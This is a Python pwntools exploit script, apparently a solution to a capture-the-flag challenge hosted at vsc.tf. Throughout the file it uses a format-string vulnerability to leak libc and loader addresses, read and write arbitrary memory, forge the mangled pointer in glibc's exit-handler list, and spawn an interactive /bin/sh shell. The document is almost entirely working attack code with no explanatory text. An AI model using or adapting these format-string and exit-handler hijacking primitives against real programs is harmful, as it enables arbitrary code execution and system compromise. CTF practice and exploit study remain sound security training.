from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./sms2_patched"
args = []
io: process = None

speed = 0#0.05

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="vsc.tf", port=7002)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

buffer_addr = 0
def exploit():
    global buffer_addr
    def trigger_ex(fmt, msg=b""):
        sla(b"essage: ", msg)
        if type(fmt) == str:
            fmt = fmt.encode("iso-8859-1")
        sla(b"Your name: ", fmt)
    def trigger(fmt, msg=b""):
        trigger_ex(fmt, msg)
        leak = recvu(b"\n===================================\nM")
        return getb(leak, b"Bushy-tailed farewells,\n", b"\n===================================")

    buffer_addr = int(trigger(b"%6$p"), 16)
    stack_addr = buffer_addr - 3
    info("buffer address: %#018x" % buffer_addr)
    trigger_ex(b"%215c%12$hhn", p64(buffer_addr - 3 - 8))
    buffer_addr -= 0x90

    def infinite_trigger(fmt, msg=b""):
        global buffer_addr
        leak = trigger(fmt, msg)
        trigger_ex(b"%215c%12$hhn", p64(buffer_addr - 3 - 8))
        buffer_addr -= 0x90
        return leak

    libc.address = int(infinite_trigger(f"%{1+18*1}$p"), 16) - 0x80faa
    info("libc: %#018x" % libc.address)
    ld.address = int(infinite_trigger(f"%{14+18*2}$p"), 16) - 0x3a040
    info("ld: %#018x" % ld.address)

    def read_str(address):
        return infinite_trigger(b"%12$s", p64(address))
    def read(address, amount):
        data = b""
        while len(data) < amount:
            data += read_str(address + len(data)) + b"\0"
        return data
    def write8(address, value):
        if value == 0:
            infinite_trigger(f"%12$hhn", p64(address))
        else:
            infinite_trigger(f"%{value}c%12$hhn", p64(address))
    def write(address, data):
        for i in range(len(data)):
            write8(address + i, data[i])

    # print(hex(libc.sym["initial"] + 0x18))
    dl_fini = ld.address + 0x6040
    print(hex(u64(read(libc.sym["initial"] + 0x18, 8))))
    cookie = u64(read(libc.sym["initial"] + 0x18, 8))
    cookie = (cookie >> 17) | ((cookie << (64-17)) & 0xffffffffffffffff)
    cookie = cookie ^ dl_fini
    info("cookie: %#018x" % cookie)

    write8(libc.sym["initial"]+0x10, 4)
    mangled = libc.sym["system"] ^ cookie
    mangled = ((mangled << 17) & 0xffffffffffffffff) | (mangled >> (64-17))
    write(libc.sym["initial"]+0x18, p64(mangled))
    # print(hex(next(libc.search(b"/bin/sh\0"))))
    write(libc.sym["initial"]+0x20, p64(next(libc.search(b"/bin/sh\0"))))
    # print("%#018x" % u64(read(libc.sym["initial"]+0x20, 8)))

    trigger_ex(b"")
    trigger_ex(b"")

    io.interactive()
    input("end")
    exit()

try:
    launch()
    exploit()
except Exception as e:
    print(e)
    input()
